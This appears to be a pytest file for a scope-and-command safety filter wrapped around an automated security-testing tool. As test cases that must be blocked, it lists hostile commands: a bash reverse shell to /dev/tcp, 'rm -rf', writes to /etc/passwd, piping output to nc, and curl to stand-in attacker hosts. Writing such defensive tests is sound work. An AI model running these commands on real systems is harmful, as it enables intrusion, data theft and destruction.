"""Tests for ultron.safety — scope validation and command filtering."""

import ipaddress
import re

import pytest
from ultron.safety import FORBIDDEN_PATTERNS, SHELL_METACHARACTERS, SafetyJail


@pytest.fixture()
def jail():
    return SafetyJail(
        allowed_targets={"example.com", "192.168.1.10"},
        allowed_networks=[
            ipaddress.ip_network("10.0.0.0/8"),
            ipaddress.ip_network("192.168.1.10/32"),
            ipaddress.ip_network("2001:db8::/32"),
        ],
    )


def test_validate_scope_allows_exact_target(jail):
    assert jail.validate_scope("example.com") is True
    assert jail.validate_scope("192.168.1.10") is True


def test_validate_scope_allows_subdomain(jail):
    assert jail.validate_scope("www.example.com") is True


def test_validate_scope_rejects_unrelated_domain(jail):
    assert jail.validate_scope("evil.example.net") is False


def test_validate_scope_allows_ip_in_network(jail):
    assert jail.validate_scope("10.42.7.99") is True


def test_validate_scope_rejects_ip_outside_network(jail):
    assert jail.validate_scope("8.8.8.8") is False


def test_validate_scope_allows_empty_target(jail):
    assert jail.validate_scope("") is True


def test_safe_command_passes(jail):
    assert jail.filter_command("nmap -sV 10.42.7.99") == (True, "OK")


def test_rm_rf_is_blocked(jail):
    ok, reason = jail.filter_command("rm -rf /var/www")
    assert ok is False
    assert "BLOCKED" in reason


def test_reverse_shell_is_blocked(jail):
    ok, _ = jail.filter_command("bash -i >& /dev/tcp/1.2.3.4/4444")
    assert ok is False


def test_write_to_etc_is_blocked(jail):
    ok, _ = jail.filter_command("echo x > /etc/passwd")
    assert ok is False


def test_out_of_scope_ip_in_command_is_blocked(jail):
    ok, reason = jail.filter_command("curl http://8.8.8.8/backdoor")
    assert ok is False
    assert "out of scope" in reason


def test_in_scope_ip_in_command_passes(jail):
    assert jail.filter_command("curl http://10.1.2.3/health")[0] is True


def test_forbidden_patterns_are_compilable():
    for pattern in FORBIDDEN_PATTERNS:
        re.compile(pattern)


class TestShellMetacharacterBlocklist:
    @pytest.mark.parametrize(
        "cmd",
        [
            "nmap 10.0.0.1; whoami",
            "nmap 10.0.0.1 && rm -rf /tmp/x",
            "nmap 10.0.0.1 | nc 8.8.8.8 4444",
            "curl http://10.0.0.1/$(cat /etc/passwd)",
            "echo `id`",
            "nmap 10.0.0.1 > /root/output",
            "curl http://10.0.0.1/a?x=1&y=2",  # & in query string
            "nmap 10.0.0.1\nid",
        ],
    )
    def test_metacharacters_are_blocked(self, jail, cmd):
        ok, reason = jail.filter_command(cmd)
        assert ok is False
        assert "metacharacter" in reason

    def test_metacharacter_pattern_covers_the_documented_set(self):
        assert SHELL_METACHARACTERS.search("a;b")
        assert SHELL_METACHARACTERS.search("a|b")
        assert SHELL_METACHARACTERS.search("a&b")
        assert SHELL_METACHARACTERS.search("a`b`")
        assert SHELL_METACHARACTERS.search("a$b")
        assert SHELL_METACHARACTERS.search("a>b")
        assert SHELL_METACHARACTERS.search("a<b")
        assert SHELL_METACHARACTERS.search("a\r")
        assert SHELL_METACHARACTERS.search("a\n")
        assert not SHELL_METACHARACTERS.search("nmap -sT --top-ports 100")

    def test_empty_command_is_blocked(self, jail):
        assert jail.filter_command("")[0] is False
        assert jail.filter_command("   ")[0] is False


class TestHostScopeChecks:
    def test_out_of_scope_url_host_is_blocked(self, jail):
        # Gap this hardening closes: domains were previously unchecked.
        ok, reason = jail.filter_command("curl http://evil.example.net/backdoor")
        assert ok is False
        assert "evil.example.net out of scope" in reason

    def test_in_scope_url_host_passes(self, jail):
        assert jail.filter_command("curl http://example.com/health")[0] is True
        assert jail.filter_command("curl https://www.example.com/a")[0] is True

    def test_url_host_with_port_still_validates_host_only(self, jail):
        assert jail.filter_command("curl http://example.com:8080/x")[0] is True

    def test_out_of_scope_bare_fqdn_is_blocked(self, jail):
        ok, reason = jail.filter_command("nmap scan.host.example.net")
        assert ok is False
        assert "scan.host.example.net out of scope" in reason

    def test_two_label_fqdn_cannot_bypass_scope_check(self, jail):
        ok, reason = jail.filter_command("nmap attacker.net")
        assert ok is False
        assert "attacker.net out of scope" in reason

    def test_in_scope_subdomain_fqdn_passes(self, jail):
        assert jail.filter_command("nmap -sV deep.example.com")[0] is True

    def test_in_scope_two_label_fqdn_passes(self, jail):
        assert jail.filter_command("nmap -sV example.com")[0] is True

    def test_ipv6_literals_are_scope_checked(self, jail):
        assert jail.filter_command("nmap -6 2001:db8::42")[0] is True
        ok, reason = jail.filter_command("nmap -6 2001:4860:4860::8888")
        assert ok is False
        assert "2001:4860:4860::8888 out of scope" in reason

    def test_bracketed_ipv6_url_is_scope_checked(self, jail):
        assert jail.filter_command("curl http://[2001:db8::42]/health")[0] is True
        ok, reason = jail.filter_command("curl http://[2606:4700:4700::1111]/")
        assert ok is False
        assert "2606:4700:4700::1111 out of scope" in reason
